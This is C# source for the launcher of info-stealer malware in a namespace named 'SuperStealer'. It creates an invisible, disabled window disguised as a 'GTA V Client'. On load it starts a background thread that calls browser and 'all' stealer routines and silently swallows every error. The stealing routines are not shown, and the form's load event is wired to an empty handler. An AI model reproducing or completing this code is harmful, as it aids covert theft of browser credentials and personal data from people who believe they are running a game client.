namespace SuperStealer
{
    using System;
    using System.ComponentModel;
    using System.Drawing;
    using System.Threading;
    using System.Windows.Forms;

    public class Form1 : Form
    {
        private IContainer components = null;

        public Form1()
        {
            this.InitializeComponent();
            Control.CheckForIllegalCrossThreadCalls = false;
            base.SuspendLayout();
            base.AutoScaleDimensions = new SizeF(6f, 13f);
            base.ClientSize = new Size(0x105, 0x7b);
            base.ControlBox = false;
            base.Enabled = false;
            base.FormBorderStyle = FormBorderStyle.None;
            base.MaximizeBox = false;
            base.MinimizeBox = false;
            base.Name = "GTA V Client";
            base.Opacity = 0.0;
            base.ShowIcon = false;
            base.ShowInTaskbar = false;
            this.Text = "GTA V Client";
            base.ResumeLayout(false);
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && (this.components != null))
            {
                this.components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            try
            {
                Thread thread = new Thread(new ThreadStart(this.GoStealer));
                thread.IsBackground = true;
                thread.Start();
            }
            catch
            {
            }
        }

        private void GoStealer()
        {
            try
            {
                Stealers.BrowsersStealer();
            }
            catch
            {
            }
            try
            {
                Stealers.GoAllStealer();
            }
            catch
            {
            }
        }

        private void InitializeComponent()
        {
            this.SuspendLayout();
            // 
            // Form1
            // 
            this.ClientSize = new System.Drawing.Size(284, 262);
            this.Name = "Form1";
            this.Load += new System.EventHandler(this.Form1_Load_1);
            this.ResumeLayout(false);

        }

        private void Form1_Load_1(object sender, EventArgs e)
        {

        }
    }
}

